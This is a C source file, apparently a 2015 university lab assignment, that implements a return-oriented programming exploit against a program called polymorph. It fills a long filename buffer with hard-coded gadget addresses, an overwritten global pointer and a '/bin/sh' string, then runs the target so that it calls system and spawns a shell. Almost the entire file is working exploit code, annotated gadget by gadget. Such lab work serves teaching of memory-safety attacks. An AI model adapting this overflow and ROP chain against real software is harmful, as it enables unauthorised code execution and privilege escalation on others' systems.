/**
 * ROP attack against Polymorph 
 *
 * Author: Shi Su, AndrewId: shis
 * Date: Thu Nov  5 15:45:14 EST 2015
 */

#include <stdio.h>
#include <stdlib.h>

/**
 * pop %eax
 * pop %ebx  
 * inc %eax ; pop %edi ; pop %esi ; ret
 * call %eax
 * 
 */

/**
 * pop %eax
 *  __ctype_get_mb_cur_max 0xb7e2b490
 *     pop %eax 0xb7e2b4af
 *     
 * pop %ebx
 * 0x08049139(null): pop %ebp ; ret
 *
 * inc %eax
 * 0xb7e7fbe0 memchr
 * 0xb7e7fdc7: inc %eax ; pop %edi ; pop %esi ; ret
 * 
 * call *%eax
 * 080488b0 <deregister_tm_clones>:
 * 0x080488d3: call *%eax
 */

int main(int argc, char *argv[]){

    // filename will be feed into the target buffer in polyporph 
    // then original, then newname

    char filename[4176];

    // file the buffer with random data
    memset((void*)filename, 'a', sizeof(filename));

    // address of pop %ebx, pop the address of ebx out
    // as we are not going to use it
    filename[4128]=0x39;
    filename[4129]=0x91;
    filename[4130]=0x04;
    filename[4131]=0x08;

    // address of target 0x0804d180
    // correctly override the address of target otherwise it will cause
    // segement fault in polymorph.c:229 strcpy( original, newname );
    filename[4132]=0x80;
    filename[4133]=0xd1;
    filename[4134]=0x04;
    filename[4135]=0x08;

    // address of pop eax 
    filename[4136]=0xaf;
    filename[4137]=0xb4;
    filename[4138]=0xe2;
    filename[4139]=0xb7;

    // (address of system) - 1, poped into eax
    filename[4140]=0x5f;
    filename[4141]=0x21;
    filename[4142]=0xe4;
    filename[4143]=0xb7;

    // address of inc %eax ; pop %edi ; pop %esi ; ret
    filename[4144]=0xc7;
    filename[4145]=0xfd;
    filename[4146]=0xe7;
    filename[4147]=0xb7;

    // 2 ramdom words for pop

    // address of call eax, i.e. call system
    filename[4156]=0xd3;
    filename[4157]=0x88;
    filename[4158]=0x04;
    filename[4159]=0x08;


    // address of /bin/bash in global variable target
    // 0x804e1c4
    filename[4160] = 0xc4;
    filename[4161] = 0xe1;
    filename[4162] = 0x04;
    filename[4163] = 0x08;

    

    // put string /bin/sh in buffer as the address of environment variable
    // each process receive changes, but the address of global variable 
    // is stable
    filename[4164] = '/';
    filename[4165] = 'b';
    filename[4166] = 'i';
    filename[4167] = 'n';
    filename[4168] = '/';
    filename[4169] = 's';
    filename[4170] = 'h';
    filename[4171] = '\0';

    // execute the victim program and feed in the exploit inpu
    execl("./polymorph", "polymorph", "-f", filename, NULL);

    return 0;

}
